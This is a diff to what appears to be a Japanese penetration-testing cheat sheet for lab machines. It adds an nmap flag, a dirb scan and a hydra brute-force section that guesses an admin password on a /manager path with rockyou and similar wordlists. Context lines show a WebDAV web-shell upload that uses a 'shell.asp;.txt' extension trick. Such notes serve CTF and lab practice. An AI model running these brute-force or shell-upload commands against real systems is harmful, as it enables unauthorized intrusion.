@@ -96,7 +96,7 @@ socialImage: "/media/cards/no-image.png"
 ``` bash
 # ターゲットマシンのIPをHOSTSに追加して高速スキャン
 sudo sed -i 's/^[0-9].*targethost.htb/10.0.0.10  targethost.htb/g' /etc/hosts
-nmap -sV -sC -T4 targethost.htb| tee nmap1.txt
+nmap -sV -sC -Pn -T4 targethost.htb| tee nmap1.txt
 rustscan -a targethost.htb --range 1-10000| tee ruststan-fast.txt
 
 # All ports
@@ -126,6 +126,9 @@ feroxbuster -u http://targethost.htb/  -x asp,aspx -w /usr/share/seclists/Discov
 
 ## --no-recursion
 feroxbuster -u http://targethost.htb/ -x php -w /usr/share/wordlists/raft-medium-directories.txt --no-recursion | tee feroxbuster.txt
+
+# dirb
+dirb http://10.10.10.95:8080
 
 # WebDAVの探索
 /usr/bin/davtest -url http://targethost.htb/
@@ -532,6 +535,16 @@ $ cadaver http://targethost.htb
 dav:/> put shell.txt
 dav:/> copy shell.txt shell.asp;.txt
 ```
+
+## ブルートフォース
+
+``` bash
+# シンプル認証
+hydra -l admin -P /usr/share/wordlists/rockyou.txt targethost.htb -s 8080 http-get /manager
+hydra -l admin -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt targethost.htb http-get /manager
+```
+
+
 
 ## その他のエクスプロイト
 
